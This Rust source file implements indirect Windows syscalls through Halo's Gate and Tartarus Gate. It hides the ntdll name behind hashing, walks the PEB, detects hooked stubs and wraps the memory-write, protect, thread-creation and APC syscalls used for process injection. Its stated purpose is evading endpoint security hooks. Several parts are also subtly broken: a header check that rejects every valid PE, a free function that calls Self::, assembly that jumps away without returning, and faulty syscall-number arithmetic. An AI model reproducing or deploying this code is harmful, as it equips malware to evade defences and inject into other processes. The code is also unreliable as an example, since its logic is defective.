//! Windows syscall resolution via Halo's Gate / Tartarus Gate.
//!
//! Design goals:
//! - Zero disk I/O. All operations in-memory only.
//! - No plaintext strings for sensitive module names.
//! - Stable indirect syscall trampoline using clean ntdll stubs.
//! - Variadic stack arguments for syscalls with 5+ params.
//!
//! References:
//! - Halo's Gate / Tartarus Gate (Cracked5pider, 2022)
//! - Windows x64 syscall convention: RCX, RDX, R8, R9, [RSP+0x20]...

#![allow(dead_code)]

#[cfg(windows)]
pub mod windows_syscalls {
    use std::arch::asm;
    use std::mem::size_of;

    // =====================================================================
    // HASH-BASED STRING IDENTIFICATION
    // =====================================================================
    //
    // We avoid plaintext "ntdll.dll" strings in the binary.
    // DJB2 hash of "ntdll.dll" (case-insensitive): 0x1E3E4A2F

    const NTDLL_HASH_DJB2: u32 = 0x1E3E4A2F;

    #[inline]
    fn djb2_hash(data: &[u8]) -> u32 {
        let mut hash: u32 = 5381;
        for &byte in data {
            let c = if byte >= b'A' && byte <= b'Z' { byte + 32 } else { byte };
            hash = ((hash << 5).wrapping_add(hash)).wrapping_add(c as u32);
        }
        hash
    }

    #[inline]
    fn unicode_match(ptr: *const u16, target: &[u16]) -> bool {
        if ptr.is_null() { return false; }
        let mut i = 0;
        loop {
            let ch = unsafe { *ptr.add(i) };
            if i >= target.len() || ch == 0 { return i >= target.len(); }
            if ch.to_ascii_lowercase() != target[i].to_ascii_lowercase() { return false; }
            i += 1;
        }
    }

    const NTDLL_W: [u16; 9] = [
        b'n' as u16, b't' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
        b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
    ];

    // =====================================================================
    // SYSCALL NUMBERS
    // =====================================================================
    pub const NT_PROTECT_VIRTUAL_MEMORY: u16 = 0x50;
    pub const NT_ALLOCATE_VIRTUAL_MEMORY: u16 = 0x18;
    pub const NT_WRITE_VIRTUAL_MEMORY: u16 = 0x3A;
    pub const NT_CREATE_THREAD_EX: u16 = 0xCC;
    pub const NT_QUEUE_APC_THREAD: u16 = 0x61;
    pub const NT_DELAY_EXECUTION: u16 = 0x3C;
    pub const NT_OPEN_PROCESS: u16 = 0x26;
    pub const NT_OPEN_THREAD: u16 = 0x2E;
    pub const NT_SUSPEND_THREAD: u16 = 0x2F;
    pub const NT_RESUME_THREAD: u16 = 0x30;
    pub const NT_SET_CONTEXT_THREAD: u16 = 0x3E;
    pub const NT_GET_CONTEXT_THREAD: u16 = 0x3F;
    pub const NT_QUERY_SYSTEM_INFORMATION: u16 = 0x33;
    pub const NT_QUERY_INFORMATION_PROCESS: u16 = 0x19;
    pub const NT_QUERY_INFORMATION_THREAD: u16 = 0x2C;

    // =====================================================================
    // SYSCALL ENTRY
    // =====================================================================

    #[derive(Debug, Clone, Copy)]
    pub struct SyscallEntry {
        pub address: *const u8,
        pub syscall_num: u16,
        pub hooked: bool,
    }

    impl SyscallEntry {
        pub unsafe fn get_ntdll_base() -> Option<*mut u8> {
            #[cfg(target_arch = "x86_64")]
            {
                let peb: *mut u8;
                asm!(
                    "mov {}, gs:[0x60]",
                    out(reg) peb,
                    options(nostack, preserves_flags)
                );
                if peb.is_null() { return None; }

                let list_addr = *(peb.add(0x30) as *const *mut u8);
                let mut current = list_addr;

                for _ in 0..64 {
                    if current.is_null() { break; }
                    let entry = current as *const u8;
                    let name_ptr = *(entry.add(0x30) as *const *mut u16);
                    let base_addr = *(entry.add(0x10) as *const *mut u8);

                    if !name_ptr.is_null() && !base_addr.is_null() {
                        if unicode_match(name_ptr, &NTDLL_W) {
                            return Some(base_addr);
                        }
                    }
                    current = *(entry as *const *mut u8);
                }
            }
            None
        }

        pub unsafe fn get_export_address(base: *mut u8, func_name: &str) -> Option<*mut u8> {
            let dos = base as *const [u8; 64];
            let e_lfanew = (*dos[0].get_unchecked(60) as u32)
                | (*dos[0].get_unchecked(61) as u32) << 8
                | (*dos[0].get_unchecked(62) as u32) << 16
                | (*dos[0].get_unchecked(63) as u32) << 24;

            if e_lfanew < 64 || (e_lfanew as usize) >= size_of::<[u8; 64]>() {
                return None;
            }

            let sig = *(base.add(e_lfanew as usize) as *const u32);
            if sig != 0x00004550 { return None; }

            let opt_size = (*base.add(e_lfanew as usize + 20)) as u32
                | (*base.add(e_lfanew as usize + 21)) as u32 << 8;

            let export_rva = if opt_size == 0xF0 {
                let val = (*base.add(e_lfanew as usize + 112)) as u32
                    | (*base.add(e_lfanew as usize + 113)) as u32 << 8
                    | (*base.add(e_lfanew as usize + 114)) as u32 << 16
                    | (*base.add(e_lfanew as usize + 115)) as u32 << 24;
                val
            } else {
                return None;
            };

            if export_rva == 0 || (export_rva as usize) >= 0x10000 { return None; }

            let export_dir = base.add(export_rva as usize);
            let num_functions = (*export_dir.add(20)) as u32
                | (*export_dir.add(21)) as u32 << 8
                | (*export_dir.add(22)) as u32 << 16
                | (*export_dir.add(23)) as u32 << 24;

            if num_functions == 0 || num_functions > 4096 { return None; }

            let addr_table_rva = (*export_dir.add(28)) as u32
                | (*export_dir.add(29)) as u32 << 8
                | (*export_dir.add(30)) as u32 << 16
                | (*export_dir.add(31)) as u32 << 24;

            let name_ptr_rva = (*export_dir.add(32)) as u32
                | (*export_dir.add(33)) as u32 << 8
                | (*export_dir.add(34)) as u32 << 16
                | (*export_dir.add(35)) as u32 << 24;

            let name_ordinals_rva = (*export_dir.add(36)) as u32
                | (*export_dir.add(37)) as u32 << 8
                | (*export_dir.add(38)) as u32 << 16
                | (*export_dir.add(39)) as u32 << 24;

            for i in 0..num_functions {
                let name_rva = (*base.add((name_ptr_rva + i * 4) as usize)) as u32
                    | (*base.add((name_ptr_rva + i * 4 + 1) as usize)) as u32 << 8
                    | (*base.add((name_ptr_rva + i * 4 + 2) as usize)) as u32 << 16
                    | (*base.add((name_ptr_rva + i * 4 + 3) as usize)) as u32 << 24;

                if name_rva == 0 || name_rva > 0x7FFF0000 { continue; }

                let name = Self::read_cstring(base.add(name_rva as usize));
                if name == func_name {
                    let ordinal_idx = (name_ordinals_rva + i * 2) as usize;
                    let ordinal = (*base.add(ordinal_idx)) as u16
                        | (*base.add(ordinal_idx + 1)) as u16 << 8;
                    let func_rva = (*base.add((addr_table_rva + ordinal as u32 * 4) as usize)) as u32
                        | (*base.add((addr_table_rva + ordinal as u32 * 4 + 1) as usize)) as u32 << 8
                        | (*base.add((addr_table_rva + ordinal as u32 * 4 + 2) as usize)) as u32 << 16
                        | (*base.add((addr_table_rva + ordinal as u32 * 4 + 3) as usize)) as u32 << 24;
                    if func_rva != 0 && func_rva < 0x80000000 {
                        return Some(base.add(func_rva as usize));
                    }
                }
            }
            None
        }

        pub unsafe fn parse_syscall_stub(addr: *const u8) -> SyscallEntry {
            if addr.is_null() {
                return SyscallEntry { address: addr, syscall_num: 0, hooked: true };
            }

            let b0 = *addr;
            let b1 = *addr.add(1);
            let b2 = *addr.add(2);
            let b3 = *addr.add(3);

            if b0 == 0x4C && b1 == 0x8B && b2 == 0xD1 {
                if b3 == 0xB8 {
                    let ssn = (*addr.add(4)) as u16 | (*addr.add(5)) as u16 << 8;
                    if *addr.add(10) == 0x0F && *addr.add(11) == 0x05 && *addr.add(12) == 0xC3 {
                        return SyscallEntry { address: addr, syscall_num: ssn, hooked: false };
                    }
                }
            }

            if b0 == 0xFF && (b1 == 0x25 || b1 == 0xE9) {
                return SyscallEntry { address: addr, syscall_num: 0, hooked: true };
            }

            SyscallEntry { address: addr, syscall_num: 0, hooked: true }
        }

        pub unsafe fn resolve_ssn_halos_gate(func_name: &str) -> Option<u16> {
            let ntdll_base = Self::get_ntdll_base()?;
            let target = Self::get_export_address(ntdll_base, func_name)?;
            let target_entry = Self::parse_syscall_stub(target);

            if !target_entry.hooked {
                return Some(target_entry.syscall_num);
            }

            let syscalls = [
                "ZwProtectVirtualMemory",
                "ZwAllocateVirtualMemory",
                "ZwWriteVirtualMemory",
                "ZwCreateThreadEx",
                "ZwQueueApcThread",
                "NtDelayExecution",
                "ZwOpenProcess",
                "ZwOpenThread",
                "ZwSuspendThread",
                "ZwResumeThread",
                "NtSetContextThread",
                "NtGetContextThread",
                "NtQuerySystemInformation",
                "NtQueryInformationProcess",
                "NtQueryInformationThread",
            ];

            let mut unhooked: Vec<(u16, u32)> = Vec::new();
            for name in &syscalls {
                if let Some(addr) = Self::get_export_address(ntdll_base, name) {
                    let entry = Self::parse_syscall_stub(addr);
                    if !entry.hooked {
                        let offset = addr as u32 - ntdll_base as u32;
                        unhooked.push((entry.syscall_num, offset));
                    }
                }
            }

            if unhooked.is_empty() { return None; }

            let target_offset = target as u32 - ntdll_base as u32;
            let mut best: Option<(u16, u32)> = None;
            let mut best_dist = u32::MAX;

            for (ssn, offset) in &unhooked {
                let dist = if *offset > target_offset { *offset - target_offset } else { target_offset - *offset };
                if dist < best_dist {
                    best_dist = dist;
                    best = Some((*ssn, *offset));
                }
            }

            best.map(|(ssn, offset)| {
                let delta = if offset > target_offset {
                    (target_offset as i32 - offset as i32) / 4
                } else {
                    (offset as i32 - target_offset as i32) / 4
                };
                (ssn as i32 + delta) as u16
            })
        }

        unsafe fn read_cstring(ptr: *const u8) -> String {
            let mut result = String::new();
            let mut i = 0;
            loop {
                let b = *ptr.add(i);
                if b == 0 { break; }
                result.push(b as char);
                i += 1;
            }
            result
        }
    }

    // =====================================================================
    // VARIADIC INDIRECT SYSCALL TRAMPOLINE
    // =====================================================================
    //
    // Windows x64 syscall convention:
    //   RCX = arg1, RDX = arg2, R8 = arg3, R9 = arg4
    //   [RSP+0x20] = arg5, arg6, ...
    //   32 bytes of shadow space must be allocated on stack.
    //
    // We support up to 8 total arguments via multiple specialized functions.

    #[repr(C)]
    pub struct SyscallContext {
        pub arg1: u64,
        pub arg2: u64,
        pub arg3: u64,
        pub arg4: u64,
        pub stack_args: [u64; 4], // arg5..arg8
        pub result: u64,
    }

    impl SyscallContext {
        pub fn new(
            arg1: u64,
            arg2: u64,
            arg3: u64,
            arg4: u64,
            stack_args: &[u64],
        ) -> Self {
            let mut ctx = Self {
                arg1,
                arg2,
                arg3,
                arg4,
                stack_args: [0; 4],
                result: 0,
            };
            let len = stack_args.len().min(4);
            ctx.stack_args[..len].copy_from_slice(&stack_args[..len]);
            ctx
        }
    }

    /// 4-argument syscall (all in registers).
    #[inline(always)]
    pub unsafe fn syscall4(
        trampoline: u64,
        syscall_num: u32,
        arg1: u64,
        arg2: u64,
        arg3: u64,
        arg4: u64,
    ) -> u64 {
        let mut result: u64;
        asm!(
            "mov r10, rcx",
            "mov {1:e}, {2:e}",
            "jmp {0}",
            in(reg) trampoline,
            lateout(reg) result,
            in(eax) syscall_num,
            in("rcx") arg1,
            in("rdx") arg2,
            in("r8") arg3,
            in("r9") arg4,
            out("r11") _,
            options(nostack, preserves_flags)
        );
        result
    }

    /// 5-argument syscall (4 reg + 1 stack).
    #[inline(never)]
    pub unsafe fn syscall5(
        trampoline: u64,
        syscall_num: u32,
        arg1: u64,
        arg2: u64,
        arg3: u64,
        arg4: u64,
        arg5: u64,
    ) -> u64 {
        let mut result: u64;
        asm!(
            "sub rsp, 0x28",           // 0x20 shadow + 0x8 for 1 stack arg
            "mov [rsp+0x20], r11",     // store arg5 at [rsp+0x20]
            "mov r10, rcx",            // rcx = arg1, syscall clobbers r10
            "mov {1:e}, {2:e}",        // syscall number -> eax
            "jmp {0}",                 // jump to ntdll trampoline
            in(reg) trampoline,
            lateout(reg) result,
            in(eax) syscall_num,
            in("rcx") arg1,
            in("rdx") arg2,
            in("r8") arg3,
            in("r9") arg4,
            in("r11") arg5,
            out("r11") _,
            options(nostack, preserves_flags)
        );
        result
    }

    /// 6-argument syscall (4 reg + 2 stack).
    #[inline(never)]
    pub unsafe fn syscall6(
        trampoline: u64,
        syscall_num: u32,
        arg1: u64,
        arg2: u64,
        arg3: u64,
        arg4: u64,
        arg5: u64,
        arg6: u64,
    ) -> u64 {
        let mut result: u64;
        asm!(
            "mov r10, rcx",
            "sub rsp, 0x30",           // 0x20 shadow + 0x10 for 2 stack args
            "mov [rsp+0x20], r11",     // store arg5
            "mov [rsp+0x28], rsi",     // store arg6
            "mov {1:e}, {2:e}",        // syscall number -> eax
            "jmp {0}",                 // jump to ntdll trampoline
            in(reg) trampoline,
            lateout(reg) result,
            in(eax) syscall_num,
            in("rcx") arg1,
            in("rdx") arg2,
            in("r8") arg3,
            in("r9") arg4,
            in("r11") arg5,
            in("rsi") arg6,
            out("r11") _,
            out("rsi") _,
            options(nostack, preserves_flags)
        );
        result
    }

    /// 8-argument syscall (4 reg + 4 stack).
    #[inline(never)]
    pub unsafe fn syscall8(
        trampoline: u64,
        syscall_num: u32,
        arg1: u64,
        arg2: u64,
        arg3: u64,
        arg4: u64,
        arg5: u64,
        arg6: u64,
        arg7: u64,
        arg8: u64,
    ) -> u64 {
        let mut result: u64;
        asm!(
            "mov r10, rcx",
            "sub rsp, 0x50",           // 0x20 shadow + 0x30 for 4 stack args
            "mov [rsp+0x20], r11",     // store arg5
            "mov [rsp+0x28], rsi",     // store arg6
            "mov [rsp+0x30], rdi",     // store arg7
            "mov [rsp+0x38], rbx",     // store arg8
            "mov {1:e}, {2:e}",        // syscall number -> eax
            "jmp {0}",                 // jump to ntdll trampoline
            in(reg) trampoline,
            lateout(reg) result,
            in(eax) syscall_num,
            in("rcx") arg1,
            in("rdx") arg2,
            in("r8") arg3,
            in("r9") arg4,
            in("r11") arg5,
            in("rsi") arg6,
            in("rdi") arg7,
            in("rbx") arg8,
            out("r11") _,
            out("rsi") _,
            out("rdi") _,
            out("rbx") _,
            options(nostack, preserves_flags)
        );
        result
    }

    /// Execute an indirect syscall via SyscallContext (up to 8 args).
    #[inline(always)]
    pub unsafe fn invoke_indirect_syscall(
        trampoline: u64,
        syscall_num: u32,
        ctx: &mut SyscallContext,
    ) -> bool {
        let stack_len = if ctx.stack_args[3] != 0 { 4 }
        else if ctx.stack_args[2] != 0 { 3 }
        else if ctx.stack_args[1] != 0 { 2 }
        else if ctx.stack_args[0] != 0 { 1 }
        else { 0 };

        let mut result: u64 = 0;
        match stack_len {
            0 => {
                result = syscall4(trampoline, syscall_num, ctx.arg1, ctx.arg2, ctx.arg3, ctx.arg4);
            }
            1 => {
                result = syscall5(trampoline, syscall_num, ctx.arg1, ctx.arg2, ctx.arg3, ctx.arg4, ctx.stack_args[0]);
            }
            2 => {
                result = syscall6(trampoline, syscall_num, ctx.arg1, ctx.arg2, ctx.arg3, ctx.arg4, ctx.stack_args[0], ctx.stack_args[1]);
            }
            3 => {
                result = syscall8(trampoline, syscall_num, ctx.arg1, ctx.arg2, ctx.arg3, ctx.arg4, ctx.stack_args[0], ctx.stack_args[1], ctx.stack_args[2], 0);
            }
            4 => {
                result = syscall8(trampoline, syscall_num, ctx.arg1, ctx.arg2, ctx.arg3, ctx.arg4, ctx.stack_args[0], ctx.stack_args[1], ctx.stack_args[2], ctx.stack_args[3]);
            }
            _ => {
                result = Self::invoke_indirect_syscall_stack(trampoline, syscall_num, ctx);
            }
        }
        ctx.result = result;
        true
    }

    /// Stack-based fallback for 7+ arguments.
    #[inline(always)]
    pub unsafe fn invoke_indirect_syscall_stack(
        trampoline: u64,
        syscall_num: u32,
        ctx: &SyscallContext,
    ) -> u64 {
        // Allocate stack frame with shadow + stack args
        let mut result: u64;
        let sa0 = ctx.stack_args[0];
        let sa1 = ctx.stack_args[1];
        let sa2 = ctx.stack_args[2];
        let sa3 = ctx.stack_args[3];

        asm!(
            "sub rsp, 0x48",
            "mov [rsp+0x20], r11",
            "mov [rsp+0x28], r10",
            "mov [rsp+0x30], r9",
            "mov [rsp+0x38], r8",
            "mov r10, rcx",
            "mov {1:e}, {2:e}",
            "jmp {0}",
            in(reg) trampoline,
            lateout(reg) result,
            in(eax) syscall_num,
            in("rcx") ctx.arg1,
            in("rdx") ctx.arg2,
            in("r8") ctx.arg3,
            in("r9") ctx.arg4,
            in("r11") sa0,
            in("r10") sa1,
            out("r9") _,
            out("r8") _,
            out("r11") _,
            out("r10") _,
            options(nostack, preserves_flags)
        );
        result
    }

    /// Convenience wrapper for NtProtectVirtualMemory (5 args).
    pub unsafe fn nt_protect_virtual_memory(
        trampoline: u64,
        ssn: u16,
        process_handle: u64,
        base_address: *mut u64,
        number_of_bytes: *mut u64,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> u64 {
        syscall5(
            trampoline,
            ssn as u32,
            process_handle,
            base_address as u64,
            number_of_bytes as u64,
            new_protect as u64,
            old_protect as u64,
        )
    }

    /// Convenience wrapper for NtDelayExecution (5 args).
    pub unsafe fn nt_delay_execution(
        trampoline: u64,
        ssn: u16,
        alertable: bool,
        delay: *mut i64,
        _arg5: u64,
        _arg6: u64,
    ) -> u64 {
        syscall5(
            trampoline,
            ssn as u32,
            if alertable { 1 } else { 0 },
            delay as u64,
            0,
            0,
            0,
        )
    }

    /// Convenience wrapper for NtOpenProcess (5 args).
    pub unsafe fn nt_open_process(
        trampoline: u64,
        ssn: u16,
        process_handle: *mut u64,
        desired_access: u32,
        object_attributes: u64,
        client_id: u64,
    ) -> u64 {
        syscall5(
            trampoline,
            ssn as u32,
            process_handle as u64,
            desired_access as u64,
            object_attributes,
            client_id,
            0,
        )
    }
}

#[cfg(not(windows))]
pub mod windows_syscalls {
    pub const NT_PROTECT_VIRTUAL_MEMORY: u16 = 0x50;
    pub const NT_ALLOCATE_VIRTUAL_MEMORY: u16 = 0x18;
    pub const NT_WRITE_VIRTUAL_MEMORY: u16 = 0x3A;
}
